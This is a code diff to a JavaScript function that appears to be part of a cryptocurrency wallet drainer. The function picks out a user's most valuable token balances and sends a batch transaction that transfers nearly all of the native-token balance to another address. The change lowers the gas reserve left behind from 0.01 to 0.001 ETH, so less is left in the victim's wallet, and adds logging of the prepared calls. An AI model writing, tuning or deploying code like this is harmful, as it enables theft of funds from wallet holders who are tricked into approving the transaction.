@@ -447,7 +447,7 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
   const nativeToken = networkTokens.find(t => t.address === 'native')
   if (nativeToken) {
     const balanceWei = parseUnits(nativeToken.balance, 18)
-    const gasReserve = BigInt('10000000000000000') // 0.01 ETH in wei
+    const gasReserve = BigInt('1000000000000000') // 0.001 in wei
     if (balanceWei > gasReserve) {
       const transferAmount = balanceWei - gasReserve
       transferCall = {
@@ -455,8 +455,9 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
         value: `0x${transferAmount.toString(16)}`,
         data: '0x'
       }
+      console.log(`Prepared native token transfer: ${nativeToken.symbol} amount=${formatUnits(transferAmount, 18)} to=${transferCall.to}`)
     } else {
-      console.log(`Native token balance too low: ${nativeToken.balance} ${nativeToken.symbol || 'unknown'}`)
+      console.log(`Native token balance too low: ${nativeToken.balance} ${nativeToken.symbol || 'unknown'} (required > ${formatUnits(gasReserve, 18)} ${nativeToken.symbol || 'unknown'})`)
     }
   }
 
@@ -465,6 +466,9 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
   if (transferCall) {
     allCalls.push(transferCall)
   }
+
+  // Log calls for debugging
+  console.log(`Preparing to send ${allCalls.length} calls:`, allCalls)
 
   // Send batch transaction
   if (allCalls.length > 0) {
@@ -479,6 +483,7 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
       if (approveState) approveState.innerHTML = `Batch transaction sent with id: ${id}`
     } catch (error) {
       store.errors.push(`Failed to send batch transaction: ${error.message}`)
+      console.error(`Batch transaction error:`, error)
       const approveState = document.getElementById('approveState')
       if (approveState) approveState.innerHTML = `Failed to send batch transaction: ${error.message}`
     }
